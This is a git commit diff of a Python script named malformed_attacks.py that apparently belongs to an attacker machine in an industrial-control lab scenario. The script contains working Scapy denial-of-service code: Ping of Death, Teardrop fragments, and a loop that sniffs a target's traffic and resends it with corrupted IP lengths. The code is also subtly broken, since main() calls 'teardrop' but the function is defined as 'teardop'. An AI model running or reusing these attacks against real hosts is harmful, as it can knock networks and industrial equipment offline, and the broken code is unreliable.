4eac9c4baafc6905e46f17c7253206f62fbbb4d8
C4denaX <48528606+C4denaX@users.noreply.github.com>
2024-09-17 10:18:44 +0200

    Update malformed_attacks.py

--- attacker_machine/escenario_scripts/malformed_attacks.py
+++ attacker_machine/escenario_scripts/malformed_attacks.py
@@ -1,61 +1,53 @@
 import random
+import argparse
 from scapy.all import *
 from time import sleep
-import nmap
-
-src_ip = ""
-
-
 
 def ping_of_death(ip_target):
+    print(f"Starting Ping of Death attack on {ip_target}")
     send(fragment(IP(dst=ip_target)/ICMP()/("X"*60000)))
 
 def teardop(ip_target):
+    print(f"Starting Teardrop Attack on {ip_target}")
     send(IP(dst=ip_target, id=42, flags="MF")/UDP()/("X"*10))
     send(IP(dst=ip_target, id=42, flags=48)/UDP()/("X"*116))
     send(IP(dst=ip_target, id=42, flags="MF")/UDP()/("X"*224))
 
 def malform_packet(pkt):
-     print(str(pkt.show()))
-     pkt[IP].len = random.randint(9,pkt[IP].len)
-     sendp(pkt)
-    
-def ip_layer_malformed_packet(ip_target,port_target):
-    sniff(iface="eth0",filter="ip dst host {}".format(ip_target),prn=malform_packet)
+    print(f"Malformed packet: {pkt.show()}")
+    pkt[IP].len = random.randint(9, pkt[IP].len)
+    sendp(pkt)
 
-def select_attack():
-    port_target = ""
-    print("Select which kind of attack would you like to make:\n 1)Ping of the death\n 2)Teardop Attack\n 3)Generic TCP Malformed Messages ")
-    attack=input("Option:")
-    ip_target = input("Introduce IP target: ")
-    if attack == "3":
-        port_target = int(input("Introduce avaliable port(S7:102,OPC:502 ,Modbus:4840)"))
-    return attack, port_target,ip_target
+def ip_layer_malformed_packet(ip_target, port_target):
+    print(f"Starting IP Layer Malformed Packets attack on {ip_target}:{port_target}")
+    sniff(iface="eth0", filter=f"ip dst host {ip_target}", prn=malform_packet)
 
+def main():
+    parser = argparse.ArgumentParser(description="Network Attack Script")
+    parser.add_argument('--attack', type=int, choices=[1, 2, 3], required=True, help="Type of attack: 1 for Ping of Death, 2 for Teardrop Attack, 3 for Malformed Packets")
+    parser.add_argument('--target-ip', type=str, required=True, help="Target IP address")
+    parser.add_argument('--target-port', type=int, help="Target port (required for attack type 3)")
 
+    args = parser.parse_args()
 
+    if args.attack == 3 and not args.target_port:
+        print("Target port is required for attack type 3")
+        exit(1)
 
-print("Welcome to malformed attacks menu by Sergio")
+    while True:
+        try:
+            if args.attack == 1:
+                ping_of_death(args.target_ip)
+            elif args.attack == 2:
+                teardrop(args.target_ip)
+            elif args.attack == 3:
+                ip_layer_malformed_packet(args.target_ip, args.target_port)
+        except KeyboardInterrupt:
+            option = input("Do you want to finish (F) or change attack (C): ")
+            if option.lower() == "c":
+                args = parser.parse_args()  # Reparse arguments to allow changes
+            else:
+                exit()
 
-attack, port_target, ip_target = select_attack()
-
-while True:
-    try:
-        if attack == "1":
-            ping_of_death(ip_target)
-        elif attack == "2":
-            teardop(ip_target)
-        elif attack == "3":
-            ip_layer_malformed_packet(ip_target,port_target)
-        else:
-            "No option allowed"
-            raise(KeyboardInterrupt)
-
-    except KeyboardInterrupt:
-        option = input("Do you want to finish(F) or change attack(C):")
-        if option == "C" or option == "c":
-            attack, port_target, ip_target = select_attack()
-        else:
-            exit()
-
-
+if __name__ == "__main__":
+    main()
